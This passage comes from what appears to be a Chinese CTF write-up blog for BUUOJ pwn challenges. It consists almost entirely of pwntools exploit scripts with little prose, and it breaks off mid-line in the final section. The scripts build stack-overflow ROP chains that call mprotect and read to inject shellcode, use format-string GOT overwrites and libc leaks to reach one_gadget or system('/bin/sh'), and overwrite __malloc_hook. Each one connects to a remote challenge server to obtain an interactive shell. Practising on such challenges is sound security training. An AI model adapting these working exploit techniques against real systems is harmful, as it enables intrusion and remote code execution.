libc.symbols['__malloc_hook']</span><br><span class="line">	log.success("libc_base: " + hex(libc_base))</span><br><span class="line">	log.success("__malloc_hook: " + hex(malloc_hook))</span><br><span class="line">	add(0x60)</span><br><span class="line">	delete(4)</span><br><span class="line">	payload = p64(malloc_hook - 35)</span><br><span class="line">	edit(2,len(payload),payload)</span><br><span class="line">	add(0x60)</span><br><span class="line">	add(0x60)</span><br><span class="line">	one_gadget = 0x4526a</span><br><span class="line">	payload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + one_gadget)</span><br><span class="line">	edit(6,len(payload),payload)</span><br><span class="line">	#gdb.attach(sh.pid)</span><br><span class="line">	add(50)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	connect(0)</span><br><span class="line">	pwn()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x05-get-started-3dsctf-2016"><a href="#0x05-get-started-3dsctf-2016" class="headerlink" title="0x05 get_started_3dsctf_2016"></a>0x05 get_started_3dsctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = "i386"</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("./get_started_3dsctf_2016")</span><br><span class="line">sh = remote("buuoj.cn",20004)</span><br><span class="line">elf = ELF("get_started_3dsctf_2016")</span><br><span class="line">pop2_ret = 0x0809a7dc</span><br><span class="line">pop3_ret = 0x0804f460</span><br><span class="line">payload = 'a' * 56 + p32(elf.symbols['mprotect']) + p32(pop3_ret) + p32(0x080EB000) + p32(0x3000) + p32(7) + p32(elf.symbols['read']) + p32(pop3_ret) + p32(0) + p32(0x080EBF80) + p32(0x200) + p32(0x080EBF80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#sleep(1)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x06-not-the-same-3dsctf-2016"><a href="#0x06-not-the-same-3dsctf-2016" class="headerlink" title="0x06 not_the_same_3dsctf_2016"></a>0x06 not_the_same_3dsctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("not_the_same_3dsctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./not_the_same_3dsctf_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	pop3_ret = 0x0809e3e5</span><br><span class="line">	#sh.recvuntil("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ")</span><br><span class="line">	offset = 45</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p32(elf.symbols['mprotect']) + p32(pop3_ret)</span><br><span class="line">	payload += p32(0x080EB000) + p32(0x1000) + p32(7)</span><br><span class="line">	payload += p32(elf.symbols['read']) + p32(pop3_ret)</span><br><span class="line">	payload += p32(0) + p32(0x080EBF81) + p32(0x100) + p32(0x080EBF81)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	payload = asm(shellcraft.sh())</span><br><span class="line">	sleep(1)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20007,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x07-bugbug-codegate-2016"><a href="#0x07-bugbug-codegate-2016" class="headerlink" title="0x07 bugbug_codegate_2016"></a>0x07 bugbug_codegate_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bugbug_codegate_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">rand = 0</span><br><span class="line">randNum = []</span><br><span class="line">def getRand(seed):</span><br><span class="line">	global randNum</span><br><span class="line">	randNum = []</span><br><span class="line">	global rand</span><br><span class="line">	rand.sendline(str(seed))</span><br><span class="line">	for i in range(0,6):</span><br><span class="line">		randNum.append(int(rand.recvuntil("\n",True),10))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	global rand</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./bugbug_codegate_2016")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("x86_libc.so.6")</span><br><span class="line">	#one step. make exit_got->start.finish loop</span><br><span class="line">	payload = p32(elf.got['exit']) + "%." + str(0x8580 - 3) + "d%17$hn"</span><br><span class="line">	size = len(payload)</span><br><span class="line">	payload = payload.ljust(0x64,"a")</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	ptr = u32(sh.recv(4))</span><br><span class="line">	stream = u32(sh.recv(4))</span><br><span class="line">	rand = process("./rand")</span><br><span class="line">	getRand(ptr)</span><br><span class="line">	sh.sendline(str(randNum[0]) + " "</span><br><span class="line">		+str(randNum[1]) + " "</span><br><span class="line">		+str(randNum[2]) + " "</span><br><span class="line">		+str(randNum[3]) + " "</span><br><span class="line">		+str(randNum[4]) + " "</span><br><span class="line">		+str(randNum[5]))</span><br><span class="line">	log.success("1 ptr = " + hex(ptr))</span><br><span class="line">	rand.close()</span><br><span class="line">	#two step. libc leak</span><br><span class="line">	sh.recvuntil("Who are you? ")</span><br><span class="line">	payload = p32(elf.got['__libc_start_main']) + "%17$s"</span><br><span class="line">	size = len(payload)</span><br><span class="line">	payload = payload.ljust(0x64,"a")</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	ptr = u32(sh.recv(4))</span><br><span class="line">	stream = u32(sh.recv(4))</span><br><span class="line">	rand = process("./rand")</span><br><span class="line">	getRand(ptr)</span><br><span class="line">	sh.sendline(str(randNum[0]) + " "</span><br><span class="line">		+str(randNum[1]) + " "</span><br><span class="line">		+str(randNum[2]) + " "</span><br><span class="line">		+str(randNum[3]) + " "</span><br><span class="line">		+str(randNum[4]) + " "</span><br><span class="line">		+str(randNum[5]))</span><br><span class="line">	rand.close()</span><br><span class="line">	sh.recvuntil("Congratulation, ")</span><br><span class="line">	sh.recv(4)</span><br><span class="line">	__libc_start_main = u32(sh.recv(4))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	puts = libc + lib.symbols['puts']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	printf = libc + lib.symbols['printf']</span><br><span class="line">	one_gadget = libc + 0x5f066</span><br><span class="line">	one_gadget1 = one_gadget >> 16</span><br><span class="line">	one_gadget2 = one_gadget % (0x10000)</span><br><span class="line">	log.success("2 ptr = " + hex(ptr))</span><br><span class="line">	log.success("libc = " + hex(libc))</span><br><span class="line">	log.success("puts = " + hex(puts))</span><br><span class="line">	log.success("system = " + hex(system))</span><br><span class="line">	log.success("printf = " + hex(printf))</span><br><span class="line">	log.success("one_gadget = " + hex(one_gadget))</span><br><span class="line">	log.success("__libc_start_main = " + hex(__libc_start_main))</span><br><span class="line">	#modify exit_got to one_gadget</span><br><span class="line">	#bp printf 0x08048960</span><br><span class="line">	#exit_got 0x0804A024</span><br><span class="line">	sh.recvuntil("Who are you? ")</span><br><span class="line">	payload  = p32(elf.got['exit']) + p32(elf.got['exit'] + 2)</span><br><span class="line">	payload += "%" + str(one_gadget2 - 8) + "d" + "%17$hn%" + str(one_gadget1 - one_gadget2) + "d%18$hn"</span><br><span class="line">	size = len(payload)</span><br><span class="line">	payload = payload.ljust(0x64,"a")</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	ptr = u32(sh.recv(4))</span><br><span class="line">	stream = u32(sh.recv(4))</span><br><span class="line">	rand = process("./rand")</span><br><span class="line">	getRand(ptr)</span><br><span class="line">	#input()</span><br><span class="line">	sh.sendline(str(randNum[0]) + " "</span><br><span class="line">		+str(randNum[1]) + " "</span><br><span class="line">		+str(randNum[2]) + " "</span><br><span class="line">		+str(randNum[3]) + " "</span><br><span class="line">		+str(randNum[4]) + " "</span><br><span class="line">		+str(randNum[5]))</span><br><span class="line">	rand.close()</span><br><span class="line">	sh.recvuntil("Congratulation, ")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20027,0)</span><br></pre></td></tr></tbody></table></figure></div>
<p>另外附上随机数生成器</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<unistd.h></unistd.h></span><br><span class="line">int main(){</span><br><span class="line">	unsigned int seed = 0;</span><br><span class="line">	scanf("%u",&seed);</span><br><span class="line">	srand(seed);</span><br><span class="line">	int i = 0;</span><br><span class="line">	int j = 0;</span><br><span class="line">	int tmp;</span><br><span class="line">	int v4[6] = {0,0,0,0,0,0};</span><br><span class="line">	for ( i = 0; i <= 5; ++i ){</span><br><span class="line">		tmp = rand() % 45 + 1;</span><br><span class="line">		LABEL_6:</span><br><span class="line">		for ( j = 0; i - 1 >= j; ++j ){</span><br><span class="line">			if ( v4[j] == tmp )</span><br><span class="line">				goto LABEL_6;</span><br><span class="line">		}</span><br><span class="line">		v4[i] = tmp;</span><br><span class="line">	}</span><br><span class="line">	for( i = 0; i<=5 ;++i){</span><br><span class="line">		printf("%d\n",v4[i]);</span><br><span class="line">	}</span><br><span class="line">	return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x08-ez-pz-hackover-2016"><a href="#0x08-ez-pz-hackover-2016" class="headerlink" title="0x08 ez_pz_hackover_2016"></a>0x08 ez_pz_hackover_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ez_pz_hackover_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ez_pz_hackover_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	sh.recvuntil("Yippie, lets crash: 0x")</span><br><span class="line">	str_addr = int(sh.recvuntil("\n",True),16)</span><br><span class="line">	offset = 16</span><br><span class="line">	payload  = "crashme\x00"</span><br><span class="line">	payload  = payload.ljust(10,"\x00")</span><br><span class="line">	payload += offset * "a"</span><br><span class="line">	payload += p32(str_addr + len(payload) + 4 - 0x3a) + asm(shellcraft.sh())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20040,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x09-tiny-backdoor-v1-hackover-2016"><a href="#0x09-tiny-backdoor-v1-hackover-2016" class="headerlink" title="0x09 tiny_backdoor_v1_hackover_2016"></a>0x09 tiny_backdoor_v1_hackover_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("tiny_backdoor_v1_hackover_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./tiny_backdoor_v1_hackover_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	#payload = "a"*0x9</span><br><span class="line">	key = 'e6d9f6382a02fd3ac3'.decode('hex')</span><br><span class="line">	sh.send(key)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20050,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x10-bbys-tu-2016"><a href="#0x10-bbys-tu-2016" class="headerlink" title="0x10 bbys_tu_2016"></a>0x10 bbys_tu_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bbys_tu_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./bbys_tu_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	offset = 24</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p32(0x0804856D)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20060,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x11-oneshot-tjctf-2016"><a href="#0x11-oneshot-tjctf-2016" class="headerlink" title="0x11 oneshot_tjctf_2016"></a>0x11 oneshot_tjctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("oneshot_tjctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./oneshot_tjctf_2016")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("x64_libc.so.6")</span><br><span class="line">	sh.recvuntil("Read location?\n")</span><br><span class="line">	sh.sendline(str(elf.got['__libc_start_main']))</span><br><span class="line">	sh.recvuntil("Value: 0x0000")</span><br><span class="line">	__libc_start_main = int(sh.recvuntil("\n",True),16)</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	one_gadget = libc + 0xf1147</span><br><span class="line">	sh.sendline(str(one_gadget))</span><br><span class="line">	log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("one_gadget: " + hex(one_gadget))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20082,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x12-pwn1-sctf-2016"><a href="#0x12-pwn1-sctf-2016" class="headerlink" title="0x12 pwn1_sctf_2016"></a>0x12 pwn1_sctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn1_sctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn1_sctf_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	payload = "I" * 19 + "a" * 7 + p32(0x08048F0D)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20086,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x13-pwn2-sctf-2016"><a href="#0x13-pwn2-sctf-2016" class="headerlink" title="0x13 pwn2_sctf_2016"></a>0x13 pwn2_sctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn2_sctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn2_sctf_2016")</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("x86_libc.so.6")</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline("-1")</span><br><span class="line">	offset = 48</span><br><span class="line">	start_addr = 0x080483D0</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p32(elf.plt['printf'])</span><br><span class="line">	payload += p32(start_addr)</span><br><span class="line">	payload += p32(0x080486F8)</span><br><span class="line">	payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(flat(payload))</span><br><span class="line">	sh.recvuntil("You said: ")</span><br><span class="line">	sh.recvuntil("You said: ")</span><br><span class="line">	__libc_start_main = u32(sh.recv(4))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system_addr = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	sh.sendline("-1")</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p32(system_addr)</span><br><span class="line">	payload += p32(0x080486F8)</span><br><span class="line">	payload += p32(binsh)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	log.success("libc:" + hex(libc))</span><br><span class="line">	log.success("system_addr:" + hex(system_addr))</span><br><span class="line">	log.success("binsh:" + hex(binsh))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20087,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x14-ciscn-2019-c-1"><a href="#0x14-ciscn-2019-c-1" class="headerlink" title="0x14 ciscn_2019_c_1"></a>0x14 ciscn_2019_c_1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 